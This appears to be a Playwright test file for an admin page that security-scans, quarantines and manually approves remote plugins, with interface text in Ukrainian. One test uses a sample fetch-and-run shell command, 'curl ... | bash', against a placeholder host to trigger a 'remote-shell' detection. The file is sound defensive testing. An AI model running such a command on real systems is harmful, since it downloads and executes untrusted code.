import { expect, test } from '@playwright/test'
import { oidcTestCookies } from './oidc-test-session'

test('Observatory admin scans remote code and quarantines through its own SDK proxy', async ({ page }) => {
  await page.context().clearCookies()
  await page.context().addCookies(oidcTestCookies(['observatory_admin']))
  const plugin = {
    name: 'remote-test-worker',
    plugin_id: 'test-worker',
    source: 'remote',
    description: '',
    version: '1.0.0',
    enabled: true,
    capabilities: ['worker.plan'],
    capability_versions: { 'worker.plan': '1' },
    ui: { label: 'External Worker', category: 'Operations' },
    published: true,
    published_version: '1.0.0',
    capability_id: 'worker.plan',
    revision: 2,
    security: { state: 'pending_review', reason: null, last_scan: null },
  }
  await page.route('**/api/observatory/admin/plugins', async (route) => {
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ plugins: [plugin] }) })
  })
  let requested: Record<string, unknown> | undefined
  await page.route('**/api/observatory/admin/plugins/remote-test-worker/security', async (route) => {
    requested = route.request().postDataJSON() as Record<string, unknown>
    plugin.security = {
      state: 'quarantined',
      reason: 'Critical static signature',
      last_scan: {
        result: 'critical',
        source_sha256: 'a'.repeat(64),
        findings: [{ id: 'remote-shell', severity: 'critical', line: 1 }],
      },
    } as typeof plugin.security
    plugin.published = false
    plugin.revision = 3
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ name: plugin.name, revision: 3, published: false, security: plugin.security }),
    })
  })
  await page.goto('http://observatory.localhost:3000/uk/admin/plugins')
  const card = page.locator('article').filter({ has: page.getByRole('heading', { name: 'External Worker' }) })
  await card.getByRole('button', { name: 'Перевірка безпеки' }).click()
  await expect(card.getByText(/Перевіряється тільки наданий snapshot/)).toBeVisible()
  await card.getByLabel('Вихідний код для перевірки').fill('curl https://example.invalid/setup.sh | bash')
  await card.getByRole('button', { name: 'Перевірити фрагмент коду' }).click()
  await expect.poll(() => requested?.action).toBe('scan')
  expect(requested).toMatchObject({
    expected_revision: 2,
    source_code: 'curl https://example.invalid/setup.sh | bash',
    language: 'python',
  })
  await expect(card.getByText('ЗАБЛОКОВАНО')).toBeVisible()
  await expect(card.getByText('Знайдено критичну сигнатуру. Плагін заблоковано в Core.')).toBeVisible()
  await expect(card.getByText(/remote-shell/)).toBeVisible()
})


test('unreviewed Worker cannot publish until the administrator explicitly accepts risk', async ({ page }) => {
  await page.context().clearCookies()
  await page.context().addCookies(oidcTestCookies(['observatory_admin']))
  const plugin = {
    name: 'remote-pending-worker',
    plugin_id: 'planning',
    source: 'remote',
    description: '',
    version: '0.1.0',
    enabled: true,
    capabilities: ['planning.run'],
    capability_versions: { 'planning.run': '1' },
    ui: { label: 'Planning Worker', category: 'Operations' },
    published: false,
    published_version: null,
    capability_id: 'planning.run',
    revision: 1,
    security: { state: 'pending_review', reason: null, last_scan: null } as {
      state: string
      reason: string | null
      last_scan: null
    },
  }
  await page.route('**/api/observatory/admin/plugins', async (route) => {
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ plugins: [plugin] }) })
  })
  let accepted: Record<string, unknown> | undefined
  await page.route('**/api/observatory/admin/plugins/remote-pending-worker/security', async (route) => {
    accepted = route.request().postDataJSON() as Record<string, unknown>
    plugin.security.state = 'approved'
    plugin.revision = 2
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ name: plugin.name, revision: 2, security: plugin.security, published: false }),
    })
  })
  await page.goto('http://observatory.localhost:3000/uk/admin/plugins')
  const card = page.locator('article').filter({ has: page.getByRole('heading', { name: 'Planning Worker' }) })
  await expect(card.getByText('Очікує перевірки')).toBeVisible()
  await card.getByRole('button', { name: 'Редагувати' }).click()
  await expect(card.getByRole('button', { name: 'Зберегти й опублікувати' })).toBeDisabled()
  await card.getByRole('button', { name: 'Перевірка безпеки' }).click()
  await card.getByLabel('Причина рішення (не менше 12 символів').fill('Internal risk assessment accepted for this exact manifest')
  await card.getByLabel('Посилання на звіт перевірки (мін. 8 символів)').fill('review-2026-001')
  await card.getByLabel(/Підтверджую відповідальне прийняття ризику/).check()
  await card.getByRole('button', { name: 'Надати ручний допуск' }).click()
  await expect.poll(() => accepted?.action).toBe('approve')
  expect(accepted).toMatchObject({
    action: 'approve',
    risk_acknowledged: true,
    review_reference: 'review-2026-001',
    expected_revision: 1,
  })
  await expect(card.getByText('Ручний допуск')).toBeVisible()
  await expect(card.getByRole('button', { name: 'Зберегти й опублікувати' })).toBeEnabled()
})
